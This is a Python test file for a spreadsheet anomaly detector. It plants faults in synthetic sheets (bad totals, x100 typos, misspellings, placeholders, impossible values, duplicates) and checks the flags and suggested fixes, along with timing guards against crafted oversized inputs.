    assert {i for i, o in enumerate(out) if "far outside" in o["reason"]} == {2}, [o["reason"] for o in out[:4]]
    # and it is no month of the series: sorted last, its ordinary MRR read as a jump in the months before it
    assert [i for i, o in enumerate(out) if o["severity"] and i != 2] == [], [(i, o["reason"]) for i, o in enumerate(out) if o["severity"]]


def test_wide_but_honest_dates_are_not_flagged():
    r = np.random.default_rng(8)
    births = [str(np.datetime64("1940-01-01") + np.timedelta64(int(d), "D")) for d in r.integers(0, 65 * 365, 300)]
    _, out = _scan(["Born", "Salary"], [[d, float(v)] for d, v in zip(births, r.normal(50000, 5000, 300))])
    assert not any("far outside" in o["reason"] for o in out)


def test_a_total_that_does_not_add_up_is_flagged():
    # taxi: total_amount != fare + extra + tax + tip + tolls in 595 rows; no detector checked arithmetic
    r = np.random.default_rng(9)
    rows = []
    for i in range(400):
        fare, tip, tax = round(float(r.lognormal(2, .5)), 2), round(float(r.uniform(0, 5)), 2), 0.5
        rows.append([f"t{i}", fare, tip, tax, round(fare + tip + tax, 2), round(float(r.uniform(0, 9)), 2)])
    for i in (5, 50, 300):
        rows[i][4] = round(rows[i][4] + 3.0, 2)
    _, out = _scan(["Trip", "Fare", "Tip", "Tax", "Total", "Miles"], rows)
    hit = {i for i, o in enumerate(out) if "does not add up" in o["reason"]}
    assert hit == {5, 50, 300}, hit
    assert "Total" in out[5]["reason"] and "Fare + Tip + Tax" in out[5]["reason"]


def test_unrelated_columns_get_no_arithmetic_flags():
    r = np.random.default_rng(10)
    rows = [[f"r{i}", *(round(float(v), 2) for v in r.normal(50, 10, 4))] for i in range(400)]
    _, out = _scan(["Id", "A", "B", "C", "D"], rows)
    assert not any("does not add up" in o["reason"] for o in out)


def test_sequence_sits_out_on_timestamped_transactions():
    # every trip has its own pickup second, so the distinct-share gate passes; the fares still don't form a series
    from anomaly_hunter.engine.detectors import sequence_detector
    from anomaly_hunter.engine.load import load_from_records
    r = np.random.default_rng(11)
    t0 = np.datetime64("2018-01-01T00:00:00")
    rows = [[str(t0 + np.timedelta64(int(s), "s")), float(r.lognormal(2, 1))] for s in sorted(r.integers(0, 365 * 86400, 400))]
    df, types, _ = load_from_records(["Pickup", "Fare"], rows)
    got = sequence_detector(df, types)
    assert not got["ran"] and "not a time series" in got["sit_out_reason"]


def test_one_negative_fare_does_not_switch_off_the_log_scale_limits():
    from anomaly_hunter.engine.limits import suggest_limits_dict
    from anomaly_hunter.engine.load import load_from_records
    r = np.random.default_rng(12)
    vals = [round(float(v), 2) for v in r.lognormal(2, 0.8, 3000)] + [-52.0]
    df, _, _ = load_from_records(["Fare"], [[v] for v in vals])
    assert sum(v > suggest_limits_dict(df, ["Fare"])["Fare"][3] for v in vals) <= 3


def test_a_common_value_is_never_weird_but_a_rare_one_is():
    # taxi: rate code 2 (JFK flat fare) is 1.7% of trips and the 5.76 toll 3.2% - tariffs, not typos. 99 is a typo.
    r = np.random.default_rng(13)
    rows = [[f"t{i}", float(r.choice([1, 2], p=[0.97, 0.03])), round(float(r.normal(12, 2)), 2)] for i in range(2000)]
    rows[7][1] = 99.0
    _, out = _scan(["Trip", "RateCode", "Fare"], rows)
    weird = {i for i, o in enumerate(out) if "RateCode weird limit" in o["reason"]}
    assert weird == {7}, sorted(weird)[:10]


# ---- 2026-10-15: e2e sheet got 71 Low "UnitCost jumped sharply" flags, one per reset of its 4-day price cycle ----

def _e2e_sales():
    # e2e/run.mjs: 300 daily orders, UnitCost cycles 1.99..4.99, plus 5 planted problems
    rows = []
    for i in range(300):
        u, c = 40 + (i * 7) % 23, 1.99 + i % 4
        rows.append([str(np.datetime64("2026-01-06") + np.timedelta64(i, "D")), ["East", "West", "Central"][i % 3], u, c, round(u * c, 2)])
    rows[10][2], rows[21][2], rows[50], rows[80][1], rows[120][2] = -5, 9999, list(rows[49]), "east ", ""
    return ["OrderDate", "Region", "Units", "UnitCost", "Total"], rows


def test_a_repeating_cycle_is_not_a_jump():
    _, out = _scan(*_e2e_sales())
    assert {i for i, o in enumerate(out) if o["severity"]} == {10, 21, 50, 80, 120}


def test_a_one_off_spike_inside_a_cycle_is_still_a_jump():
    cols, rows = _e2e_sales()
    rows = [r[:4] for r in rows[150:]]  # no planted problems, no Total
    rows[60][3] = 49.9
    _, out = _scan(cols[:4], rows)
    assert "UnitCost jumped sharply" in out[60]["reason"]


# ---- 2026-10-15 blind cross-domain bench (backend/bench/datasets3.py): what it exposed ----

def test_a_line_total_that_is_not_qty_times_price_is_flagged():
    # purchase orders, invoices, stock value: the commonest computed column is a product, and nothing checked it
    r = np.random.default_rng(21)
    rows = []
    for i in range(150):
        qty, price = int(r.choice([10, 20, 25, 50, 100])), round(float(r.uniform(1.8, 85)), 2)
        rows.append([f"PO-{i}", qty, price, round(qty * price, 2)])
    for i in (7, 70):
        rows[i][3] = round(rows[i][3] * 1.37, 2)
    _, out = _scan(["PO", "Qty", "Unit Price", "Line Total"], rows)
    hit = {i for i, o in enumerate(out) if "does not add up" in o["reason"]}
    assert hit == {7, 70}, hit
    assert "Qty × Unit Price" in out[7]["reason"] and out[7]["severity"] in ("Medium", "High")


def test_the_rows_own_arithmetic_gives_the_fix_for_its_one_odd_cell():
    # Units -5 and 9999 with Total intact: Total / UnitCost is the true value - exact, not a median "best guess"
    _, out = _scan(*_e2e_sales())
    assert out[10]["likely"] == {"Units": 41} and out[21]["likely"] == {"Units": 49}
    r = np.random.default_rng(26)
    rows = []
    for i in range(150):
        qty, price = int(r.choice([10, 20, 25, 50, 100])), round(float(r.uniform(1.8, 85)), 2)
        rows.append([f"PO-{i}", qty, price, round(qty * price, 2)])
    price = rows[40][2]
    rows[40][2] = round(price * 100, 2)  # Unit Price typed x100, Line Total still right
    rows[90][1], rows[90][2] = 9999, round(rows[90][2] * 100, 2)  # two odd cells: the arithmetic can't say which
    _, out = _scan(["PO", "Qty", "Unit Price", "Line Total"], rows)
    assert out[40]["likely"] == {"Unit Price": price}
    assert "Qty" not in out[90]["likely"] and out[90]["likely"].get("Unit Price") != round(rows[90][3] / 9999, 2)


def test_a_line_total_after_a_discount_that_does_not_add_up_is_flagged_and_its_odd_cell_solved():
    # order sheets: Total = Units x Unit Price x (1 - Discount). Only 2-column products were checked, so a total off by
    # 37% passed 3 of 3 blind-bench seeds, and a Discount typed 25 (for 0.25) got the median instead of 0.25
    r = np.random.default_rng(31)
    rows = []
    for i in range(200):
        u, pr = int(r.choice([1, 2, 3, 4, 5])), round(float(r.uniform(8, 600)), 2)
        dc = float(r.choice([0, 0, 0, 0.05, 0.1, 0.15, 0.2, 0.25]))
        rows.append([f"O-{i}", u, pr, dc, round(u * pr * (1 - dc), 2)])
    rows[17][4] = round(rows[17][4] * 1.37, 2)
    i = next(k for k in range(100, 200) if rows[k][3] == 0.25)
    rows[i][3] = 25
    _, out = _scan(["Order", "Units", "Unit Price", "Discount", "Order Total"], rows)
    hit = {k for k, o in enumerate(out) if "does not add up" in o["reason"]}
    assert hit == {17, i}, hit
    assert "Units × Unit Price × (1 - Discount)" in out[17]["reason"] and out[17]["severity"] in ("Medium", "High")
    assert out[i]["likely"] == {"Discount": 0.25}


def test_a_two_part_sum_is_checked_even_on_a_small_sheet_with_a_typo_elsewhere():
    # 48 months x 5 number columns: under sums' 20-rows-per-column floor "Net New = New + Churned" was never checked,
    # and a x10 typo in New MRR bends its least squares away from 0/1 weights anyway
    r = np.random.default_rng(22)
    rows, mrr = [], 118000.0
    for m in range(48):
        new, ch = round(mrr * float(r.uniform(0.045, 0.06))), -round(mrr * float(r.uniform(0.015, 0.03)))
        rate, mrr = round(-ch / mrr, 4), mrr + new + ch
        rows.append([f"{2022 + m // 12}-{m % 12 + 1:02d}-01", round(mrr), new, ch, new + ch, rate])
    rows[30][4] = round(rows[30][4] * 1.37)
    rows[12][2] *= 10  # a typo in a part: its row doesn't add up either
    _, out = _scan(["Month", "MRR", "New MRR", "Churned MRR", "Net New MRR", "Churn %"], rows)
    hit = {i for i, o in enumerate(out) if "does not add up" in o["reason"]}
    assert hit == {12, 30}, hit
    assert "Net New MRR" in out[30]["reason"] and "New MRR + Churned MRR" in out[30]["reason"]


def test_two_honest_clusters_in_a_signed_column_are_not_weird():
    # bank Amount: mostly small withdrawals, a quarter deposits spread up to +3200 - "weird" landed at 2500, inside the
    # deposits (17 Medium false alarms here, 16 in the blind bench). A deposit typed x100 is still caught.
    r = np.random.default_rng(28)
    kinds = r.choice(["Deposit", "Withdrawal", "Transfer", "Fee", "Card"], 240, p=[.25, .4, .15, .05, .15])
    amt = {"Deposit": lambda: r.uniform(250, 3200), "Withdrawal": lambda: -r.uniform(20, 900), "Transfer": lambda: -r.uniform(100, 1500),
           "Fee": lambda: -float(r.choice([2.5, 5, 12, 35])), "Card": lambda: -r.uniform(5, 250)}
    rows = [[f"T{i}", str(k), round(float(amt[k]()), 2)] for i, k in enumerate(kinds)]
    dep = next(i for i, k in enumerate(kinds) if k == "Deposit" and rows[i][2] > 1000)
    rows[dep][2] = round(rows[dep][2] * 100, 2)
    _, out = _scan(["Txn", "Type", "Amount"], rows)
    assert {i for i, o in enumerate(out) if o["severity"] in ("Medium", "High")} == {dep}


def test_a_short_form_of_several_words_or_a_contraction_is_worth_a_check():
    r = np.random.default_rng(24)
    rows = [[f"P{i}", str(r.choice(["Backlog", "In Progress", "In Review", "Done"])), str(r.choice(["Basic", "Standard", "Premium"]))]
            for i in range(120)]
    rows[10][1], rows[20][2] = "In Prog", "Std"
    _, out = _scan(["Ticket", "Status", "Plan"], rows)
    assert '"In Prog" looks like a short form of "In Progress"' in out[10]["reason"] and out[10]["severity"] == "Low"
    assert '"Std" looks like a short form of "Standard"' in out[20]["reason"] and out[20]["severity"] == "Low"


def test_a_country_is_not_a_contraction_of_another_country():
    """Census native-country (UCI Adult, 2026-10-15): "Iran" was called a short form of "Ireland" in 56 rows - its
    letters appear in order inside it. A contraction keeps the word's first AND last letter (Std, Mgmt, Dept, Bldg)."""
    r = np.random.default_rng(26)
    rows = [[f"p{i}", str(r.choice(["United-States", "Mexico", "Iran", "Ireland", "Peru", "Portugal"]))] for i in range(240)]
    _, out = _scan(["Id", "Country"], rows)
    assert not any("short form" in o["reason"] for o in out)


def test_common_contractions_keep_first_and_last_letters():
    from anomaly_hunter.engine.pipeline import _short_for
    for short, long in (("std", "standard"), ("mgmt", "management"), ("dept", "department"), ("bldg", "building"),
                        ("acct", "account"), ("govt", "government")):
        assert _short_for(short, long), short
    assert not _short_for("iran", "ireland")


def test_two_real_labels_are_not_called_short_forms():
    r = np.random.default_rng(25)
    rows = [[f"x{i}", str(r.choice(["Fee", "Free", "Paid", "Trial"]))] for i in range(120)]
    _, out = _scan(["Id", "Kind"], rows)
    assert not any("short form" in o["reason"] for o in out)


def test_a_minus_sign_in_a_count_column_is_not_excused_as_its_tail():
    # blind bench, On Hand -26 (median 69): stock 0-21 lies between it and halfway back, so the long-tail rule called
    # it "the column's own tail" and only noted it. A negative where under 1% of the column is negative is a slip
    r = np.random.default_rng(41)
    rows = [[f"SKU-{i}", int(r.integers(0, 230))] for i in range(220)]
    rows[60][1] = -26
    _, out = _scan(["SKU", "On Hand"], rows)
    assert "On Hand weird limit is 0; this is -26" in out[60]["reason"] and out[60]["severity"] not in (None, "Noted")
    assert out[60]["likely"] == {"On Hand": 26}


def test_a_x100_slip_in_a_skewed_column_stands_alone_and_votes():
    # blind bench, First Response 430 hrs for 4.3: response times mixed by priority are skewed, the log-scale weird
    # limit sat above the slip, and it was only noted. Past the usual limit, alone, with an exact /100 behind it: a typo
    r = np.random.default_rng(43)
    med = {"Low": 10, "Normal": 5, "High": 2, "Urgent": 0.6}
    rows = []
    for i in range(260):
        pr = str(r.choice(list(med), p=[.3, .45, .2, .05]))
        rows.append([f"T-{i}", pr, max(0.1, round(float(r.lognormal(np.log(med[pr]), 0.5)), 1))])
    rows[33][2] = 510.0  # 5.1 typed x100
    _, out = _scan(["Ticket", "Priority", "First Response (hrs)"], rows)
    assert out[33]["severity"] not in (None, "Noted") and out[33]["likely"] == {"First Response (hrs)": 5.1}
    assert [i for i, o in enumerate(out) if o["severity"] not in (None, "Noted")] == [33]  # the skewed tail stays quiet


def test_a_mildly_skewed_column_keeps_its_honest_heavy_users_and_still_catches_a_x100_slip():
    # blind bench (fresh seed 33), telecom Minutes: log-normal around 408 with an honest 2,410 (6x the median). Its
    # upper spread was 1.82x the lower one - under the old cut of 2 - so its limits were set as if symmetric (weird
    # 1,600) and the heavy user was called wrong; on 5 other seeds the same column read 2.1-2.7 and got log limits.
    # Same shape, 22 of 60 random sheets fell under the cut
    r = np.random.default_rng(11)
    rows = [[f"C-{i}", int(r.lognormal(np.log(380), 0.55))] for i in range(280)]  # upper/lower spread 1.70
    rows[40][1] = 2346  # a real heavy user, 6x the median
    rows[90][1] = 39100  # 391 typed x100 (the bench plants x100 here; a x10 next to a 6x-median user is not clear-cut)
    _, out = _scan(["Customer", "Minutes"], rows)
    assert out[40]["severity"] in (None, "Noted", "Low"), out[40]["reason"]
    assert out[90]["severity"] not in (None, "Noted") and out[90]["likely"] == {"Minutes": 391}


def test_rows_that_differ_only_in_text_typed_into_a_number_column_are_not_duplicates():
    # blind real-sheet test 2026-10-16 (a long-format election sheet): the PVI codes "R+33.2" and "D+6.3" were called duplicates in
    # 513 rows - duplicates were compared after text in a number column had been turned into blanks
    rows = [[f"race{i}", 1000 + i * 37 % 50 * 2.5, 5] for i in range(60)]
    for i, text in enumerate(["02B", "03A", "R+33.2", "D+6.3"]):
        rows[i] = ["statewide", text, 5]
    rows[30] = list(rows[29])  # one real repeat
    types, out = _scan(["Race", "Value", "Seats"], rows)
    assert types["Value"] == "number" and [i for i, o in enumerate(out) if "Duplicate" in o["reason"]] == [30]


def test_tbd_is_a_placeholder():
    rows = [[f"n{i}", ["Cash", "Card", "Online"][i % 3]] for i in range(60)]
    rows[9][1] = "TBD"
    _, out = _scan(["Name", "Pay"], rows)
    assert out[9]["reason"] == 'Placeholder "TBD" in column Pay'


def test_a_whole_word_of_a_longer_label_is_not_its_short_form():
    # blind real-sheet test 2026-10-16: Periode "II" was called a short form of "II-III?" in 123 rows, and the pane's card
    # wrote "II-III?" over a correct period. A whole word of another label is a label of its own
    r = np.random.default_rng(28)
    rows = [[f"s{i}", str(r.choice(["I", "II", "II-III?", "III", "IV"]))] for i in range(150)]
    _, out = _scan(["Sample", "Periode"], rows)
    assert not any("short form" in o["reason"] for o in out)


def test_a_letter_typed_twice_is_worth_a_check():
    # blind real-sheet test 2026-10-16: "NOTT DONE", "itraconazolle", "trrump_2020" and "Gouurde" were all missed - only a
    # wrong or swapped letter counted. A doubled letter is the commonest added letter, and rarely a different word
    from anomaly_hunter.engine.pipeline import _one_edit
    assert _one_edit("nott done", "not done") and _one_edit("itraconazole", "itraconazolle")
    assert not _one_edit("laptops", "laptop") and not _one_edit("sarah", "sara")
    r = np.random.default_rng(27)
    rows = [[f"s{i}", str(r.choice(["DONE", "NOT DONE", "PENDING"]))] for i in range(90)]
    rows[40][1] = "NOTT DONE"
    _, out = _scan(["Id", "Status"], rows)
    assert out[40]["reason"] == 'Status "NOTT DONE" looks like a misspelling of "NOT DONE"' and out[40]["severity"] == "Low"


def test_labels_longer_than_60_characters_are_never_compared_as_misspellings(monkeypatch):
    # council review 2026-10-16: a crafted column of 32,000-character labels took 58 s in the letter-typed-twice check.
    # Text over 60 characters is a note, not a category label (the same line the AI text check draws)
    from anomaly_hunter.engine import pipeline
    seen = []
    real = pipeline._one_edit
    monkeypatch.setattr(pipeline, "_one_edit", lambda a, b: seen.append(max(len(a), len(b))) or real(a, b))
    long = ["b" + "a" * 30000 + chr(98 + k // 5) + chr(98 + k % 5) for k in range(25)]  # letters only: word-like
    rows = [[f"r{i}", long[i % 25]] for i in range(125)] + [[f"x{k}", "aa" + long[k][1:]] for k in range(25)]
    _scan(["Id", "Note"], rows)
    assert not seen or max(seen) <= 60


def test_a_blank_that_its_whole_category_group_shares_is_the_sheets_layout():
    # blind real-sheet test 2026-10-16: a long-format election sheet fills "value" for some metrics and "pct" for others;
    # 17,852 rows were flagged "Blank cell ... otherwise filled" and the card wrote the median in. A blank its whole
    # group shares is how the sheet is laid out; a blank inside a group that is otherwise filled is still a slip
    r = np.random.default_rng(29)
    rows = []
    for i in range(300):
        metric = ["votes", "votes", "votes", "votes", "share", "pop", "pop", "pop"][i % 8]
        value = "" if metric == "share" else int(r.integers(1000, 9000))
        pct = "" if metric == "votes" else round(float(r.uniform(5, 60)), 1)
        rows.append([f"D{i % 30}", metric, value, pct])
    rows[101][2] = ""  # a real slip: "pop" rows fill value everywhere else
    _, out = _scan(["District", "Metric", "Value", "Pct"], rows)
    assert [i for i, o in enumerate(out) if "Blank cell" in o["reason"]] == [101]


def test_text_codes_a_number_column_uses_many_times_are_its_own_code_system():
    # blind real-sheet test 2026-10-16: 4,409 partisan-lean codes ("R+51.5") and 3,591 district labels ("16A") were each
    # flagged as text in a number column. A shape the column repeats 5+ times is its code system; a one-off slip is not
    r = np.random.default_rng(30)
    rows = [[f"r{i}", round(float(r.uniform(100, 900)), 1)] for i in range(400)]
    for i in range(0, 30):
        rows[i * 10 + 3][1] = f"{'RD'[i % 2]}+{r.integers(1, 40)}.{r.integers(0, 9)}"
    rows[7][1], rows[8][1] = "12O", "NA"
    types, out = _scan(["Row", "Value"], rows)
    assert types["Value"] == "number"
    # a one-off "NA" is a missing value, a blank, still flagged (AH-27: R writes NA for every missing number)
    assert [i for i, o in enumerate(out) if "Text" in o["reason"]] == [7]
    assert out[8]["severity"] == "Medium" and out[8]["reason"] == "Blank cell in column Value, which is otherwise filled", out[8]


def test_a_rare_dash_in_a_number_column_is_a_placeholder_never_a_zero():
    # blind real-sheet test 2026-10-16: 5 of 6 missed placeholders were a "-" typed for a missing price, read as 0. Excel
    # hands the pane an accounting-format zero as the number 0, so a "-" was typed; only a sheet-wide convention is 0
    from anomaly_hunter.engine.load import load_from_records
    rows = [[f"car{i}", 3000 + i * 37 % 900] for i in range(74)]
    rows[29][1] = "-"
    df, types, _ = load_from_records(["Car", "Price"], rows)
    assert types["Price"] == "number" and np.isnan(df["Price"][29])
    _, out = _scan(["Car", "Price"], rows)
    assert out[29]["reason"] == 'Placeholder "-" in column Price' and out[29]["severity"] == "Medium"


def test_a_lone_decimal_in_a_column_of_whole_numbers_is_worth_a_check():
    # blind real-sheet test 2026-10-16: study day 7.3 (typed for 73) between days 72 and 74 - no limit can catch it
    r = np.random.default_rng(31)
    rows = [[f"s{i}", int(r.integers(1, 200))] for i in range(120)]
    rows[40][1] = 7.3
    _, out = _scan(["Subject", "Study day"], rows)
    assert out[40]["reason"] == "Study day 7.3 is not a whole number - every other Study day is" and out[40]["severity"] == "Low"
    assert sum(1 for o in out if o["severity"] not in (None, "Noted")) == 1


def test_a_value_past_what_its_column_name_allows_is_worth_a_check():
    # John's "syntactically correct but contextually impossible" (AI council 2026-10-16): Month 13, Hour 25 and a 6 on
    # a 1-5 rating passed every check - each is just past the column's other values, so no limit can call it
    rows = [[f"s{i}", 1 + i % 12, 1 + i % 4, i % 24, 1 + i % 5, round(-40 + (i * 7) % 80 + 0.5, 1)] for i in range(120)]
    rows[30][1], rows[50][2], rows[70][3], rows[90][4], rows[110][5] = 13, 5, 25, 6, 91.5
    cols = ["Order", "Month", "Quarter", "Hour", "Rating (1-5)", "Latitude"]
    _, out = _scan(cols, rows)
    expect = {30: "Month 13 is outside what Month can be (1 to 12)", 50: "Quarter 5 is outside what Quarter can be (1 to 4)",
              70: "Hour 25 is outside what Hour can be (0 to 24)", 90: "Rating (1-5) 6 is outside what Rating (1-5) can be (1 to 5)",
              110: "Latitude 91.5 is outside what Latitude can be (-90 to 90)"}
    for i, words in expect.items():
        assert words in out[i]["reason"] and out[i]["severity"] == "Low", (i, out[i])
    assert {i for i, o in enumerate(out) if o["severity"] not in (None, "Noted")} == set(expect)


def test_a_column_whose_name_means_something_else_keeps_quiet():
    # yyyymm months, zero-based visit months, hours worked, longitudes on 0-360 (real quakes table), day-of-month counts
    rows = [[202601 + i % 12, i % 5, 30 + (i * 7) % 31, 165 + (i * 3) % 24, 1 + i % 31, 10 + i % 400] for i in range(120)]
    rows[5][0] = 202613  # no month can be 13 here either - but a column that's never 1-12 is not about months
    cols = ["Month", "month", "Hours", "long", "date of month", "Study Day"]
    _, out = _scan(cols, rows)
    assert not [o["reason"] for o in out if "can be" in o["reason"]]
    import time
    from anomaly_hunter.engine import pipeline
    t = time.perf_counter()  # a crafted header is a note, not a name: no regex gets to backtrack through it
    assert pipeline._bounds("(" * 32000 + "1-5)") is None and pipeline._bounds("Month" + " (" * 99) is None
    assert time.perf_counter() - t < 0.5


def test_a_sign_flip_fix_is_the_exact_value_never_rounded():
    # blind real-sheet test 2026-10-16: -0.0201808419078588 got "likely 0.02018084191" and the card called it
    # "missing zeros - /1" instead of a flipped sign
    from anomaly_hunter.engine.detectors import column_stats, likely_value
    x = np.abs(np.random.default_rng(32).normal(0.02, 0.005, 300))
    v = -0.0201808419078588
    assert likely_value(v, column_stats(np.append(x, v)), 0.0, 0.05) == 0.0201808419078588


def test_a_crafted_wide_sheet_cannot_make_the_column_pair_checks_run_for_minutes():
    # council review 2026-10-16: checks over every pair of columns grow with the square (wrong-column) or the cube
    # (products x fractions) of the width - 400 text columns took 30 s and 160 number columns 16 s on 50k cells.
    # Capped in sheet order (the first 100 / 64 columns), so a scan still gives the same answer every time
    import time
    from anomaly_hunter.engine import pipeline
    from anomaly_hunter.engine.load import load_from_records
    rows = [[("x" if i % 2 else "y") if i < 74 else f"u{k}_{i}" for k in range(400)] for i in range(122)]
    df, types, _ = load_from_records([f"T{k}" for k in range(400)], rows)
    t = time.perf_counter()
    pipeline.shifted(df, types, np.zeros(len(df), bool))
    assert time.perf_counter() - t < 10
    r = np.random.default_rng(5)
    rows = [[float(r.uniform(0, 0.9)) if k % 2 else float(r.uniform(10, 500)) for k in range(160)] for _ in range(100)]
    df, types, _ = load_from_records([f"N{k}" for k in range(160)], rows)
    t = time.perf_counter()
    pipeline.pairs(df, types, np.zeros(len(df), bool), None)
    assert time.perf_counter() - t < 10


def test_columns_that_are_mostly_zero_are_not_taken_for_a_product_rule():
    # round-2 blind real sheet 2026-10-16: three TV-spot columns were 0 in 91% of weeks, so "A = B x C" held in 95% of rows
    # (0 = 0 x anything) and the 56 weeks with real spots were called "does not add up". A rule must hold where the
    # numbers aren't all zero: here it held in 64 of 120 such rows
    r = np.random.default_rng(33)
    rows = [[f"w{i}", 0.0, 0.0, 0.0, round(float(r.uniform(100, 900)), 2)] for i in range(1200)]
    for k, i in enumerate(r.choice(1200, 120, replace=False)):
        a_, b_ = round(float(r.uniform(0.5, 3)), 2), round(float(r.uniform(0.5, 3)), 2)
        rows[i][1:4] = [round(a_ * b_, 4) if k < 64 else round(float(r.uniform(0.5, 9)), 2), a_, b_]  # 64 of 120 match
    _, out = _scan(["Week", "SpotsA", "SpotsB", "SpotsC", "Sales"], rows)
    assert not any("does not add up" in o["reason"] for o in out)


def test_identical_answers_in_a_short_survey_are_not_duplicates():
    # round-2 blind real sheet 2026-10-16: four agree/disagree answers from 1,529 voters - only 199 different answer sets,
    # so 1,330 rows were "Duplicate of row N". When most rows repeat, a repeat is the data, not a double entry
    r = np.random.default_rng(34)
    scale = ["Strongly agree", "Agree", "Disagree", "Strongly disagree"]
    rows = [[str(r.choice(scale)) for _ in range(4)] for _ in range(600)]
    _, out = _scan(["Q1", "Q2", "Q3", "Q4"], rows)
    assert not any("Duplicate" in o["reason"] for o in out)


def test_a_common_label_is_never_called_a_short_form_of_a_rarer_one():
    # round-2 blind judge 2026-10-16: "CAF" (51 rows) was "a short form of CONCACAF" (30 rows) and "VI" of "VIII" (20 each):
    # 71 cards would have written over correct labels. A short form is the rarer spelling: the full label is at
    # least twice as common (the credit sheet's 30 "EMP" next to ~80 "Employed" still are one)
    r = np.random.default_rng(35)
    rows = [[f"t{i}", str(r.choice(["CAF", "CAF", "CONCACAF", "UEFA", "AFC"]))] for i in range(200)]
    rows += [[f"c{i}", str(r.choice(["VI", "VIII", "IX"]))] for i in range(60)]
    _, out = _scan(["Team", "Group"], rows)
    assert not any("short form" in o["reason"] for o in out)


def test_a_measurement_headed_no_is_checked_but_a_row_number_no_stays_an_id():
    # round-2 blind judge 2026-10-16: nitric oxide "NO" (repeating whole numbers) was read as "No." - an ID - so 6,900 among
    # readings of 20-80 was never checked. "No" is an ID only when its numbers don't repeat
    r = np.random.default_rng(36)
    rows = [[i + 1, int(r.integers(20, 80)), round(float(r.uniform(5, 30)), 1)] for i in range(200)]
    rows[50][1] = 6900
    types, out = _scan(["No.", "NO", "PM10"], rows)
    assert types["No."] == "id" and types["NO"] == "number"
    assert "NO weird limit" in out[50]["reason"] and out[50]["severity"] in ("Medium", "High")


# The cross-column score was pyod's ECOD until 2026-10-19: pyod pulled numba, llvmlite, matplotlib and scikit-learn
# into the exe (146 MB, minutes to download) for this one score. These values were computed with pyod 3.6.6.
def _x60():
    rng = np.random.default_rng(60)
    x = np.column_stack([np.round(rng.standard_normal(60), 1), np.full(60, 7.0), np.exp(rng.standard_normal(60)),
                         rng.integers(0, 4, 60)])
    x[17, 2] = 1e12  # detectors.BIG: a spread-capped cell
    return x


def test_the_cross_column_score_matches_hand_computed_ecod_values():
    from anomaly_hunter.engine.detectors import _ecod
    a = np.array([[0, 5], [0, 5], [1, 5], [2, 5], [10, 5]], float)  # a constant column scores 0
    assert np.allclose(_ecod(a), np.log([2.5, 2.5, 5 / 3, 2.5, 5]), rtol=1e-12)
    b = np.column_stack([a, [-10, -2, -1, 0, 0], [1, 2, 3, 4, 5]])  # a left-skewed and an even column
    assert np.allclose(_ecod(b), [4.135166556742355, 2.972015746936675, 2.043302495063962, 2.972015746936675,
                                  4.135166556742355], rtol=1e-12)


def test_the_cross_column_score_keeps_the_values_recorded_from_pyod():
    from anomaly_hunter.engine.detectors import _ecod
    pyod = [4.40449949053, 3.50655789732, 4.16333743371, 3.96526751995, 4.58319127927, 5.4161004022, 4.43527114919,
            4.74827102963, 2.26621744882, 3.04897678807, 4.13516655674, 2.65926003693, 2.77704307259, 3.50655789732,
            6.73785624219, 4.16333743371, 2.47166142304, 6.80239476332, 6.04470906163, 6.06045741859, 2.37157796448,
            3.82686519709, 2.25132883633, 4.21212759788, 4.22217793373, 5.04885650692, 5.44141821019, 5.83731386728,
            3.57555076881, 5.07962816558, 5.48063892334, 2.93956200209, 4.07454193493, 2.74887219562, 2.19190541586,
            3.42140008898, 4.90777790866, 3.45249067605, 4.93059258642, 4.78749174278, 4.83878503717, 7.60090245954,
            3.36197666851, 3.28341434601, 3.7578723256, 5.35156188107, 2.4304184645, 5.92692602597, 3.24704670183,
            2.65926003693, 4.78749174278, 3.80916561999, 4.18135593921, 4.26869794937, 3.37921847494, 6.87138763481,
            3.64681378883, 2.69480497435, 5.15373613774, 2.80649027392]
    assert np.allclose(_ecod(_x60()), pyod, rtol=1e-10)


def test_the_cross_column_score_refuses_a_blank_or_infinite_value():
    # pyod refused these, and that turned a subnormal-spread bug into a visible error (test_fuzz_api, 2026-10-16)
    import pytest
    from anomaly_hunter.engine.detectors import _ecod
    for bad in (np.nan, np.inf, -np.inf):
        x = _x60()
        x[3, 0] = bad
        with pytest.raises(ValueError):
            _ecod(x)
